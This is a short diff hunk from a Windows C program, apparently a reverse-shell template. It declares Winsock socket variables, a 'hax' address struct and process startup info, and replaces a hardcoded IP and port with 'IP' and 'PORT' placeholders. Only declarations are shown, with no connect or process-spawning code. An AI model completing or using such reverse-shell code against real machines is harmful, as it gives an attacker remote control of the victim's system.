@@ -5,8 +5,8 @@
 WSADATA wsaData;
 SOCKET Winsock;
 struct sockaddr_in hax; 
-char ip_addr[16] = "10.10.10.10"; 
-char port[6] = "NaN";            
+char ip_addr[16] = "IP"; 
+char port[6] = "PORT";            
 
 STARTUPINFO ini_processo;
 
